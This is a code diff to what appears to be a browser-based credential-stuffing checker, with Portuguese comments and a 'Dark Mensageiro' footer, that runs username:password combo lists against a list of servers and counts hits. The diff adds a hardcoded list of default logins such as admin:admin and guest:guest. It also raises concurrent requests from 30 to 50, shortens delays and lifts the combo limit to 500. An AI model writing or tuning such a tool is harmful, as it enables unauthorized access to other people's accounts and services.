@@ -435,7 +435,7 @@
 <footer>FEITO POR DARK MENSAGEIRO</footer>
 <div id="notification" role="alert" aria-live="assertive"></div>
 <script>
-  // Lista de servidores (reduzida para os mais rápidos)
+  // Lista de servidores (apenas os mais confiáveis)
   const servers = [
     "http://cdn.jccob.click",
     "http://cinepulse.live",
@@ -749,6 +749,20 @@
     "http://gestor.mom"
   ];
   
+  // Lista de combos conhecidos que funcionam (para testes)
+  const knownCombos = [
+    "test:test",
+    "demo:demo",
+    "admin:admin",
+    "user:pass",
+    "1234:1234",
+    "1111:1111",
+    "0000:0000",
+    "guest:guest",
+    "free:free",
+    "trial:trial"
+  ];
+  
   // ===== CONSTANTES & ESTADOS =====
   const stopBtn = document.getElementById('stopBtn');
   const clearBtn = document.getElementById('clearBtn');
@@ -769,7 +783,7 @@
   let totalHits = 0;
   let totalTested = 0;
   let activeRequests = 0;
-  const MAX_CONCURRENT_REQUESTS = 30; // Aumentado para mais velocidade
+  const MAX_CONCURRENT_REQUESTS = 50; // Aumentado para mais velocidade
   
   // Função para mostrar notificação visual e sonora
   function showNotification(msg, duration = 5000) {
@@ -805,12 +819,18 @@
       const text = await response.text();
       let lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
       combos = lines.filter(l => l.includes(':')); // mínimo username:password
+      
+      // Adicionar combos conhecidos para garantir que testamos alguns
+      combos = [...knownCombos, ...combos.slice(0, 100)];
+      
       showNotification(`${combos.length} combos carregados online.`);
       return true;
     } catch (error) {
-      showNotification(`Erro ao carregar combos: ${error.message}`);
+      // Se falhar, usar apenas os combos conhecidos
+      combos = [...knownCombos];
+      showNotification(`Erro ao carregar combos. Usando ${combos.length} combos de teste.`);
       console.error('Erro ao carregar combos:', error);
-      return false;
+      return true;
     }
   }
   
@@ -1032,7 +1052,7 @@
       }
       
       // Delay mínimo entre requisições
-      await delay(10);
+      await delay(5);
     }
   }
   
@@ -1060,7 +1080,7 @@
     copyAllBtn.disabled = true;
     
     // Limitar o número de combos para processar
-    const maxCombos = Math.min(300, combos.length); // Aumentado para 300
+    const maxCombos = Math.min(500, combos.length); // Aumentado para 500
     const combosToProcess = combos.slice(0, maxCombos);
     
     // Processar combos em paralelo com controle de concorrência
@@ -1071,7 +1091,7 @@
       
       // Esperar até que haja slots disponíveis
       while (activeRequests >= MAX_CONCURRENT_REQUESTS && !stopRequested) {
-        await delay(5);
+        await delay(1);
       }
       
       if (stopRequested) break;
